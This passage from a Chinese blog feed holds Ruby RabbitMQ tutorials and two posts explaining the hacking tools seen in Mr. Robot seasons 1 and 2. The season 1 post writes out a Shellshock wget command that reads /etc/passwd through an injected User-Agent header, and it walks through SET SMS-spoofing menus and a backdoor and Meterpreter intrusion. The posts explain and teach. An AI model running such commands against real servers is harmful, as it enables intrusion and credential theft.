class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p><a href="http://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/worker.rb" target="_blank" rel="noopener">(worker.rb 源码)</a></p><p>使用消息响应和<code>prefetch</code>你就可以搭建起一个工作队列了。这些持久化的选项使得在RabbitMQ重启之后仍然能够恢复。</p><p>关于<code>Bunny::Channel</code>更多的方法和消息属性，可以浏览<a href="http://reference.rubybunny.info/" target="_blank" rel="noopener">Bunny API文档</a>。</p><p>现在我们可以移步教程3学习如何发送相同的消息给多个消费者（consumers）。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RabbitMQ教程（二）──工作队列&quot;&gt;&lt;a href=&quot;#RabbitMQ教程（二）──工作队列&quot; class=&quot;headerlink&quot; title=&quot;RabbitMQ教程（二）──工作队列&quot;&gt;&lt;/a&gt;RabbitMQ教程（二）──工作队列&lt;/h1&gt;&lt;p&gt;（使
      
    
    </summary>
    
      <category term="Ruby" scheme="http://jack0pan.github.io/categories/Ruby/"/>
    
    
      <category term="RabbitMQ" scheme="http://jack0pan.github.io/tags/RabbitMQ/"/>
    
      <category term="Ruby" scheme="http://jack0pan.github.io/tags/Ruby/"/>
    
      <category term="翻译" scheme="http://jack0pan.github.io/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>RabbitMQ教程（一）──你好世界</title>
    <link href="http://jack0pan.github.io/2017/10/01/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%E2%94%80%E2%94%80%E4%BD%A0%E5%A5%BD%E4%B8%96%E7%95%8C/"/>
    <id>http://jack0pan.github.io/2017/10/01/RabbitMQ教程（一）──你好世界/</id>
    <published>2017-10-01T14:08:31.000Z</published>
    <updated>2018-04-13T15:18:58.307Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RabbitMQ教程（一）──你好世界"><a href="#RabbitMQ教程（一）──你好世界" class="headerlink" title="RabbitMQ教程（一）──你好世界"></a>RabbitMQ教程（一）──你好世界</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>RabbitMQ是一个消息代理。它的工作就是接收和转发消息。你可以把它想像成一个邮局：你把信件放入邮箱，邮递员就会把信件投递到你的收件人处。在这个比喻中，RabbitMQ就扮演着邮箱、邮局以及邮递员的角色。</p><p>RabbitMQ和邮局的主要区别在于，它不是处理纸张，而是接收、存储和转发消息（message）──二进制数据。</p><p>下面是RabbitMQ和消息所涉及到的一些术语：</p><ul><li><code>生产(Producing)</code>的意思就是发送。发送消息的程序就是一个生产者(producer)。我们一般用”P”来表示:</li></ul><p><img src="https://www.rabbitmq.com/img/tutorials/producer.png" alt="producer"></p><ul><li><code>队列(queue)</code>就是存在于RabbitMQ中邮箱的名称。虽然消息的传输经过了RabbitMQ和你的应用程序，但是它只能被存储于队列当中。实质上队列就是个巨大的消息缓冲区，它的大小只受主机内存和硬盘限制。多个生产者（producers）可以把消息发送给同一个队列，同样，多个消费者（consumers）也能够从同一个队列（queue）中获取数据。队列可以绘制成这样（图上是队列的名称）：</li></ul><p><img src="https://www.rabbitmq.com/img/tutorials/queue.png" alt="queue"></p><ul><li><code>消费（Consuming）</code>，和接收(receiving)是同一个意思。一个消费者（consumer）就是一个等待获取消息的程序。我们把它绘制为”C”：</li></ul><p><img src="https://www.rabbitmq.com/img/tutorials/consumer.png" alt="consumer"></p><p>需要指出的是生产者、消费者、代理需不要待在同一个设备上；事实上大多数应用也确实不在会将他们放在一台机器上。</p><h2 id="你好世界"><a href="#你好世界" class="headerlink" title="你好世界!"></a>你好世界!</h2><p>（使用Bunny Ruby客户端）</p><p>接下来我们用Ruby写两个小程序。一个发送单条消息的生产者（producer）和一个接收消息并将其输出的消费者（consumer）。我们将详细介绍<a href="http://rubybunny.info/" target="_blank" rel="noopener">Bunny</a> API中的一些细节，从传递”Hello World”消息，这种简单的事情开始。</p><p>下图中，“P”代表生产者，“C”代表消费者，中间的盒子代表为消费者保留的消息缓冲区，也就是我们的队列。</p><p><img src="https://www.rabbitmq.com/img/tutorials/python-one.png" alt="python-one"></p><p>生产者（producer）把消息发送到一个名为“hello”的队列中。消费者（consumer）从这个队列中获取消息。</p><blockquote><p><strong>Bunny客户端</strong></p><p>RabbitMQ有多种协议，教程中使用的是AMQP 0.9.1协议。这是一个用于消息传递的开放、通用的协议。针对<a href="http://rabbitmq.com/devtools.html" target="_blank" rel="noopener">不同编程语言</a>有大量的RabbitMQ客户端可用。在这个系列教程中，RabbitMQ团队推荐使用Bunny这个最常用的Ruby客户端。</p><p>首先，使用<a href="http://rubygems.org/" target="_blank" rel="noopener">Rubygems</a>安装Bunny：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install bunny --version &quot;&gt;= 2.6.4&quot;</span><br></pre></td></tr></table></figure></p></blockquote><p>现在，我们已经安装了Bunny，我们可以写点代码了。</p><h3 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h3><p><img src="https://www.rabbitmq.com/img/tutorials/sending.png" alt="sending"></p><p>我们称消息生产者为<code>send.rb</code>，消息消费者为<code>receive.rb</code>。生产者将先连接RabbitMQ，发送一个消息，然后直接退出。</p><p>在<code>send.rb</code>中，我们先应用库：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br></pre></td></tr></table></figure></p><p>然后连接RabbitMQ服务器<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">connection = Bunny.new</span><br><span class="line">connection.start</span><br></pre></td></tr></table></figure></p><p>这里的连接帮我们简化了一些socket连接事项，比如协议版本、认证等等。现在我们已经用默认配置跟本地机器的代理建立了连接。</p><p>如果你想连接到其他机器的代理上，需要把<code>:hostname</code>改为指定的名字或IP地址。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">connection = Bunny.new(<span class="symbol">hostname:</span> <span class="string">'rabbit.local'</span>)</span><br><span class="line">connection.start</span><br></pre></td></tr></table></figure></p><p>接下来，我们创建一个通道，大部分的API功能都是在这里完成的：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channel = connection.create_channel</span><br></pre></td></tr></table></figure></p><p>在发送消息之前，我们需要声明一个队列，然后推送消息到这个队列中：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">queue = channel.queue(<span class="string">'hello'</span>)</span><br><span class="line"></span><br><span class="line">channel.default_exchange.publish(<span class="string">'Hello World!'</span>, <span class="symbol">routing_key:</span> queue.name)</span><br><span class="line">puts <span class="string">" [x] Sent 'Hello World!'"</span></span><br></pre></td></tr></table></figure></p><p>最后，我们需要关闭这个连接：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connection.close()</span><br></pre></td></tr></table></figure></p><p><a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/send.rb" target="_blank" rel="noopener">完整的<code>send.rb</code>代码</a></p><blockquote><p>发送不成功！</p><p>如果这是你第一次使用RabbitMQ，并且没有看到“Sent”消息出现在屏幕上，你可能会抓耳挠腮不知所以。这也许是因为没有足够的磁盘空间给代理使用所造成的（代理默认需要200MB的空闲空间），所以它才会拒绝接收消息。查看一下代理的日志文件进行确认，如果需要的话也可以减少限制。<a href="http://www.rabbitmq.com/configure.html#config-items" target="_blank" rel="noopener">配置文件文档</a>会告诉你如何更改磁盘空间限制（disk_free_limit）。</p></blockquote><h3 id="接收"><a href="#接收" class="headerlink" title="接收"></a>接收</h3><p>之前是我们的生产者。我们的消费者是从RabbitMQ中取消息，和生产者只推送一条消息不同，我们将会一直监听消息，并将它们打印出来。</p><p><img src="https://www.rabbitmq.com/img/tutorials/receiving.png" alt="receiving"></p><p>和<code>send.rb</code>一样，<code>receive.rb</code>代码也要先引入库：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br></pre></td></tr></table></figure></p><p>初始化和生产者一样，我们打开连接和通道，并声明一个队列用来消费。需要注意的是这里队列名要和生产者的一直。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">connection = Bunny.new</span><br><span class="line">connection.start</span><br><span class="line"></span><br><span class="line">channel = connection.create_channel</span><br><span class="line">queue = channel.queue(<span class="string">'hello'</span>)</span><br></pre></td></tr></table></figure></p><p>注意在这里我们也要声明队列。因为消费者可能在生产者之前启动，我们要确保在从队列里去消息前，这个队列已被创建。</p><p>现在我们要告诉服务器把消息交付给我们。由于服务器是异步的推送给我们消息，我们需要提供一个回调函数，当RabbitMQ推送消息给我们时就执行回调函数。这里用<code>Bunny::Queue#subscribe</code>来实现。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line">  puts <span class="string">' [*] Waiting for messages. To exit press CTRL+C'</span></span><br><span class="line">  queue.subscribe(<span class="symbol">block:</span> <span class="literal">true</span>) <span class="keyword">do</span> <span class="params">|_delivery_info, _properties, body|</span></span><br><span class="line">    puts <span class="string">" [x] Received <span class="subst">#&#123;body&#125;</span>"</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">rescue</span> Interrupt =&gt; <span class="number">_</span></span><br><span class="line">  connection.close</span><br><span class="line"></span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p><code>Bunny::Queue#subscribe</code>使用了<code>:block</code>选项来阻塞线程（因为我们不想脚本立马执行完）。</p><p><a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/receive.rb" target="_blank" rel="noopener">完整的<code>receive.rb</code>代码</a>。</p><h3 id="整合到一起"><a href="#整合到一起" class="headerlink" title="整合到一起"></a>整合到一起</h3><p>现在我们可以运行前面的脚本了。在终端里，运行消费者：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby receive.rb</span><br></pre></td></tr></table></figure></p><p>然后运行生产者：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby send.rb</span><br></pre></td></tr></table></figure></p><p>消费者会打印从RabbitMQ获得的生产发送的消息。消费者将会一直运行，等待消息（通过Ctrl-C来中止它），所以在另一个终端运行生产者吧。</p><blockquote><p><strong>列出所有队列</strong></p><p>你也许希望查看RabbitMQ中有哪些队列、有多少消息在队列中。此时你可以使用<code>rabbitmqctl</code>工具（使用有权限的用户）：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rabbitmqctl list_queues</span><br></pre></td></tr></table></figure><blockquote><p>在Windows中不需要sudo命令:</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl.bat list_queues</span><br></pre></td></tr></table></figure><p>是时候移步到第二部分了，我们将会建立一个简单的工作队列（work queue）。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RabbitMQ教程（一）──你好世界&quot;&gt;&lt;a href=&quot;#RabbitMQ教程（一）──你好世界&quot; class=&quot;headerlink&quot; title=&quot;RabbitMQ教程（一）──你好世界&quot;&gt;&lt;/a&gt;RabbitMQ教程（一）──你好世界&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
      <category term="Ruby" scheme="http://jack0pan.github.io/categories/Ruby/"/>
    
    
      <category term="RabbitMQ" scheme="http://jack0pan.github.io/tags/RabbitMQ/"/>
    
      <category term="Ruby" scheme="http://jack0pan.github.io/tags/Ruby/"/>
    
      <category term="翻译" scheme="http://jack0pan.github.io/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>技术分析之黑客军团第二季</title>
    <link href="http://jack0pan.github.io/2016/11/13/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E9%BB%91%E5%AE%A2%E5%86%9B%E5%9B%A2%E7%AC%AC%E4%BA%8C%E5%AD%A3/"/>
    <id>http://jack0pan.github.io/2016/11/13/技术分析之黑客军团第二季/</id>
    <published>2016-11-13T14:14:34.000Z</published>
    <updated>2016-11-13T14:19:13.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="技术分析之黑客军团第二季"><a href="#技术分析之黑客军团第二季" class="headerlink" title="技术分析之黑客军团第二季"></a>技术分析之黑客军团第二季</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这一季中牵扯到技术方面的剧情相对第一季少一点，而且有几个地方是一笔带过，我就没有详细分析。我从中挑四个场景，简单分析一下。</p><a id="more"></a><h2 id="第一集"><a href="#第一集" class="headerlink" title="第一集"></a>第一集</h2><h3 id="Cryptowall"><a href="#Cryptowall" class="headerlink" title="Cryptowall"></a>Cryptowall</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S02E01-cryptowall.jpg" alt="Cryptowall"></p><p>从后面的剧情可以看出，这个是一个勒索软件。而且，他们已经集成到<code>SET</code>（在第一季中有提到）中，设置一下服务器的地址和密码，之后写到U盘中，并添加了一个<code>autorun.inf</code>文件，这个文件作用就是：U盘插入电脑后会自动运行<code>fsocietyM.exe</code>程序。</p><h2 id="第八集"><a href="#第八集" class="headerlink" title="第八集"></a>第八集</h2><h3 id="Android-Stagefright"><a href="#Android-Stagefright" class="headerlink" title="Android Stagefright"></a>Android Stagefright</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S02E08-Android-Stagefright.jpg" alt="Android Stagefright"></p><p>这个场景中使用的是<code>Android Stagefright</code>漏洞利用，一个很真实场景。对话先从手机型号开始，然后谈到安卓手机和苹果手机哪个好，技术人员喜欢那数字说话，所以各自不服，就跑个分。女黑客在自己的电脑上先生成一个<code>mp4</code>文件，将这个文件嵌入到伪装的测速网站中，让胖子黑客去访问。女黑客利用<code>Stagefright</code>漏洞，成功拿到胖子黑客手机的<code>root</code>权限。</p><h2 id="第九集"><a href="#第九集" class="headerlink" title="第九集"></a>第九集</h2><h3 id="mimitakz"><a href="#mimitakz" class="headerlink" title="mimitakz"></a>mimitakz</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S02E09-mimitakz.jpg" alt="mimitakz"></p><p><code>Angela</code>先把<code>Rubber Ducky</code>插到<code>Joseph</code>的电脑（<code>Rubber Ducky</code>在第六集中有提到，当时只是把它当作备用方案，当时没有使用，<code>Angela</code>在这集中用了），使用的时候需要给它装一个SD卡，它被插入电脑中，会自动运行里面的<code>mimitakz</code>，这个程序会扫描电脑中各种帐号和密码，然后保存到SD卡中。之后<code>Angela</code>从SD卡中找到了<code>Joseph</code>的帐号和密码。</p><h2 id="第十一集"><a href="#第十一集" class="headerlink" title="第十一集"></a>第十一集</h2><h3 id="Red-Wheelbarrow-BBQ"><a href="#Red-Wheelbarrow-BBQ" class="headerlink" title="Red Wheelbarrow BBQ"></a>Red Wheelbarrow BBQ</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S02E11-Red-Whellbarrow-BBQ.jpg" alt="Red Wheelbarrow BBQ"></p><p>宣传单正面有一堆数字，它们大小不超过26，可以推测：1对应a、2对应b、…，26对应z，转换一下得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gurcreevacntrfjvyyuryclbhsvaqlbhepnyyvatohgqbagorqhcrqphgqbjagurjbbqfgurlorreqbf</span><br></pre></td></tr></table></figure></p><p>上面这串字母是<code>ROT-13</code>加密之后的字符串，去<a href="http://decode.org/" target="_blank" rel="noopener">DECODE ORG</a>（去看看吧，有惊喜）解密，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the perrin pages will help you find your calling but dont be duped cut down the woods they be erdos</span><br></pre></td></tr></table></figure></p><p>这句话里有提到两个数列：Perrin numbers和Erdos numbers。在宣传单的背面还有一堆数字，从其中删掉上面两个数列中的数字，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32 35 31 41 53 45 43 52 45 54</span><br></pre></td></tr></table></figure></p><p>很明显是<code>ASCII码</code>，我们去<a href="http://www.ascii2hex.com/" target="_blank" rel="noopener">ASCII 2 Hex</a>解码，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">251ASECRET</span><br></pre></td></tr></table></figure></p><p>这是一个电话号码，打开手机拨号的键盘，照着按键就可以得到以下号码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(251) 273-2738</span><br></pre></td></tr></table></figure></p><p>其实，这一套流程是从<a href="http://potatohatsecurity.tumblr.com/post/94565729529/defcon-22-badge-challenge-walkthrough" target="_blank" rel="noopener">DEFCON 22 Badge Challenge</a>那里照搬过来的，稍微调整了一下形式。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;技术分析之黑客军团第二季&quot;&gt;&lt;a href=&quot;#技术分析之黑客军团第二季&quot; class=&quot;headerlink&quot; title=&quot;技术分析之黑客军团第二季&quot;&gt;&lt;/a&gt;技术分析之黑客军团第二季&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这一季中牵扯到技术方面的剧情相对第一季少一点，而且有几个地方是一笔带过，我就没有详细分析。我从中挑四个场景，简单分析一下。&lt;/p&gt;
    
    </summary>
    
      <category term="美剧" scheme="http://jack0pan.github.io/categories/%E7%BE%8E%E5%89%A7/"/>
    
    
      <category term="美剧" scheme="http://jack0pan.github.io/tags/%E7%BE%8E%E5%89%A7/"/>
    
  </entry>
  
  <entry>
    <title>技术分析之黑客军团第一季</title>
    <link href="http://jack0pan.github.io/2016/10/30/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E9%BB%91%E5%AE%A2%E5%86%9B%E5%9B%A2%E7%AC%AC%E4%B8%80%E5%AD%A3/"/>
    <id>http://jack0pan.github.io/2016/10/30/技术分析之黑客军团第一季/</id>
    <published>2016-10-30T07:38:12.000Z</published>
    <updated>2016-10-30T07:42:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="技术分析之黑客军团第一季"><a href="#技术分析之黑客军团第一季" class="headerlink" title="技术分析之黑客军团第一季"></a>技术分析之黑客军团第一季</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文只是对居中用到黑客工具（非常用，像<code>ping</code>等常用工具略过）进行分析，不对剧情进行分析解释。</p><a id="more"></a><h2 id="第一集"><a href="#第一集" class="headerlink" title="第一集"></a>第一集</h2><h3 id="elpscrk"><a href="#elpscrk" class="headerlink" title="elpscrk"></a>elpscrk</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E01-elpscrk.jpg" alt="elpscrk"></p><p>图中用到<code>elpscrk</code>命令，这个并不是<code>Linux</code>命令，根据使用过程，看出是用自动破解用户密码的，所以猜测是<code>Elliot</code>自己写的工具，全称可能是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELliot&apos;s PaSsword CRacKer</span><br></pre></td></tr></table></figure></p><h3 id="astsu"><a href="#astsu" class="headerlink" title="astsu"></a>astsu</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E01-astsu.jpg" alt="astsu"></p><p>同样，<code>astsu</code>也是一个没有见过的命令，从截图中可以看出，<code>Elliot</code>在对服务器操作过程中经常用到，根据使用，推测一下选项的解释：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info - 显示服务器信息</span><br><span class="line">backup - 显示备份服务器</span><br><span class="line">short - 显示简略信息</span><br><span class="line">ifconfig - 这是一个Linux命令，用来配置网络接口的</span><br></pre></td></tr></table></figure></p><p>根据以上信息，推测是他们自己开发一套服务器操作工具，全称可能如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A Server sTatuS Util</span><br></pre></td></tr></table></figure></p><h2 id="第二集"><a href="#第二集" class="headerlink" title="第二集"></a>第二集</h2><h3 id="Bash-Shellshock"><a href="#Bash-Shellshock" class="headerlink" title="Bash Shellshock"></a>Bash Shellshock</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E02-Bash%20Shellshock.jpg" alt="Bash Shellshock"></p><p>这个截图是<code>Elliot</code>在黑<code>E公司</code>的邮件服务器，用的是去年的非常有名的漏洞<code>Bash Shellshock</code>（中文：破壳）。用以下命令拿到服务器的<code>/etc/passwd</code>文件，保存到本地的<code>status</code>文件中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -U <span class="string">"() [test;];echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd"</span> http://evilcorp-intl.com/login.email.srf?wa=wsignial.0&amp;rpsnv=4d</span><br></pre></td></tr></table></figure></p><p>之后就是用<code>john</code>工具来破解<code>status</code>文件中帐号的密码。</p><h2 id="第五集"><a href="#第五集" class="headerlink" title="第五集"></a>第五集</h2><h3 id="Social-Engineering-Toolkit"><a href="#Social-Engineering-Toolkit" class="headerlink" title="Social-Engineering Toolkit"></a>Social-Engineering Toolkit</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E05-Social-Engineering%20Toolkit.jpg" alt="SET"></p><p>这里使用的是<code>Social-Engineering Toolkit</code>（社会工程学工具箱，简称SET），用了<code>SMS Spoofing</code>攻击，给那个主管发了一条短信。过程如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> Select from the menu:</span><br><span class="line"></span><br><span class="line">   1) Social-Engineering Attacks</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">  99) Return back to the main menu.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt; 1</span><br><span class="line"></span><br><span class="line"> Select from the menu:</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line">   7) SMS Spoofing Attack Vector</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">  99) Return back to the main menu.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt; 7</span><br><span class="line"></span><br><span class="line"> Select from the menu:</span><br><span class="line"></span><br><span class="line">   1) Perform a SMS Spoofing Attack</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">  99) Return back to the main menu.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt; 1</span><br><span class="line"></span><br><span class="line"> Select from the menu:</span><br><span class="line"></span><br><span class="line">   1) SMS Attack Single Phone Number</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">  99) Return back to the main menu.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt; 1</span><br><span class="line"></span><br><span class="line">Send SMS to: ...</span><br></pre></td></tr></table></figure></p><h2 id="第六集"><a href="#第六集" class="headerlink" title="第六集"></a>第六集</h2><h3 id="Aircrack-ng"><a href="#Aircrack-ng" class="headerlink" title="Aircrack-ng"></a>Aircrack-ng</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E06-Aircrack-ng.jpg" alt="Aircracj-ng"><br><code>Aircrack-ng</code>是无线破解常用工具，<code>Elliot</code>安装在他的手机中了，图中表示他在扫描周围的无线信号，但是它们的是<code>wpa2</code>加密方式，意味着很难抓握手包，从而无法实施入侵。</p><h3 id="PLCPackage"><a href="#PLCPackage" class="headerlink" title="PLCPackage"></a>PLCPackage</h3><p>这里<code>Elliot</code>是要入侵监狱的控制系统，这样才能打开监狱的大门。以下是入侵过程：<br>先给自己的笔记本安装一个<code>MultiBlue Dongle</code>，这样笔记本才能有蓝牙功能。<br><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E06-MultiBlue%20Dongle.jpg" alt="MultiBlue Dongle"><br>先开启自己的蓝牙设备（截图中右边的终端），并用<code>hciconfig</code>命令查看自己的蓝牙设备信息。在另一个终端（左下的终端）里，用<code>hcitool inq</code>查看可配对设备的信息。<br><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E06-bluesniff.jpg" alt="bluesniff"><br>需要说一下<code>bluesniff</code>这个命令（左上的终端），我在网上并没有找到相关信息，根据第一条命令，看出这个工具是现从源码编译的，根据下图推测这个工具的作用是把自己的电脑伪装成对方的蓝牙键盘，这样就可以控制对方的笔记本。<br><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E06-keyboard.jpg" alt="keyboard"><br>连上对方笔记本后，开终端，登录自己的<code>ftp</code>服务，下载后门程序，并执行。<br><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E06-backdoor.jpg" alt="backdoor"><br>然后，通过<code>ssh</code>登录自己的电脑，使用<code>Meterpreter</code>工具连上后门，通过狱警的笔记本进入监狱网络，在网络中搜索<code>PLC</code>设备，并入侵控制，这样就可以控制监狱的系统啦。<br><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E06-attack.jpg" alt="PLCPackage"></p><p>以上是第一季中我觉得可以拿来学习和借鉴的一些场景，当然剧中还有其他攻击场景（常见的或者一笔带过的），我也略过，大家还是自己去看吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;技术分析之黑客军团第一季&quot;&gt;&lt;a href=&quot;#技术分析之黑客军团第一季&quot; class=&quot;headerlink&quot; title=&quot;技术分析之黑客军团第一季&quot;&gt;&lt;/a&gt;技术分析之黑客军团第一季&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文只是对居中用到黑客工具（非常用，像&lt;code&gt;ping&lt;/code&gt;等常用工具略过）进行分析，不对剧情进行分析解释。&lt;/p&gt;
    
    </summary>
    
      <category term="美剧" scheme="http://jack0pan.github.io/categories/%E7%BE%8E%E5%89%A7/"/>
    
    
      <category term="美剧" scheme="http://jack0pan.github.io/tags/%E7%BE%8E%E5%89%A7/"/>
    
  </entry>
  
  <entry>
    <title>数字证书-Ruby</title>
    <link href="http://jack0pan.github.io/2016/09/22/%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6-Ruby/"/>
    <id>http://jack0pan.github.io/2016/09/22/数字证书-Ruby/</id>
    <published>2016-09-22T14:52:42.000Z</published>
    <updated>2016-10-02T14:58:54.000Z</updated>
    
